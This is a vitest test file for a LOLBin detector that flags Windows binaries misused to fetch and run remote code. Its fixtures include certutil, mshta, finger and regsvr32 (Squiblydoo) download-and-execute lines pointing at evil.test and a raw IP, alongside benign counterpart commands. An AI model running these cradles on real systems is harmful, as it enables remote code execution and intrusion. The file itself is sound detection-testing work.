import { describe, expect, it } from 'vitest'
import { matchLolbin } from '../lolbins'
import { buildContext } from '../techniques'
import { preprocess } from '../preprocess'

function ctx(text: string, raw = text) {
  return buildContext(text, preprocess(raw).flags)
}

describe('matchLolbin', () => {
  it('hits certutil used as a downloader (-urlcache http)', () => {
    const r = matchLolbin(ctx("certutil.exe -urlcache -split -f http://45.9.148.20/a.exe a.exe"))
    expect(r.hit).toBe(true)
    expect(r.techniqueIds).toContain('T1105')
    expect(r.trigger?.toLowerCase()).toContain('certutil')
  })

  it('hits mshta launching a remote payload', () => {
    const r = matchLolbin(ctx("mshta http://evil.test/x.hta"))
    expect(r.hit).toBe(true)
    expect(r.techniqueIds).toContain('T1218.005')
  })

  it('does NOT hit certutil doing legitimate cert work (no URL / download verb)', () => {
    const r = matchLolbin(ctx("certutil -hashfile payload.bin SHA256"))
    expect(r.hit).toBe(false)
  })

  it('does NOT hit prose that merely mentions a binary name', () => {
    const r = matchLolbin(ctx("Write-Host 'run regsvr32 to register the dll'"))
    expect(r.hit).toBe(false)
  })

  it('does NOT hit certutil -decode (a local, non-download/exec deobfuscation op)', () => {
    const r = matchLolbin(ctx('certutil -decode payload.b64 out.exe'))
    expect(r.hit).toBe(false)
  })
})

describe('finger LOLBin', () => {
  it('hits finger used as a download cradle inside a for /f loop', () => {
    const r = matchLolbin(ctx("for /f %e in ('finger user@45.9.148.20') do %e"))
    expect(r.hit).toBe(true)
    expect(r.techniqueIds).toContain('T1105')
  })

  it('does NOT hit a bare finger command (no discriminator)', () => {
    const r = matchLolbin(ctx('finger user@example.com'))
    expect(r.hit).toBe(false)
  })
})

const ctxFor = (s: string) => buildContext(s, [], 'unknown')

describe('LOLBin benign-twin discipline (review 2.3)', () => {
  it('benign regsvr32 /u /s <local dll> does NOT match', () => {
    expect(matchLolbin(ctxFor('regsvr32 /u /s C:\\Program Files\\MyApp\\shell-extension.dll')).hit).toBe(false)
  })
  it('real Squiblydoo (regsvr32 /i:http scrobj) still matches', () => {
    expect(matchLolbin(ctxFor('regsvr32 /s /n /u /i:http://evil.test/a.sct scrobj.dll')).hit).toBe(true)
  })
  it('benign rundll32 shell32.dll,Control_RunDLL does NOT match', () => {
    expect(matchLolbin(ctxFor('rundll32.exe shell32.dll,Control_RunDLL')).hit).toBe(false)
  })
  it('benign msiexec /i app.msi /qn does NOT match', () => {
    expect(matchLolbin(ctxFor('msiexec /i app.msi /qn')).hit).toBe(false)
  })
  it('benign installutil app.exe does NOT match', () => {
    expect(matchLolbin(ctxFor('installutil /u C:\\app\\thing.exe')).hit).toBe(false)
  })
})
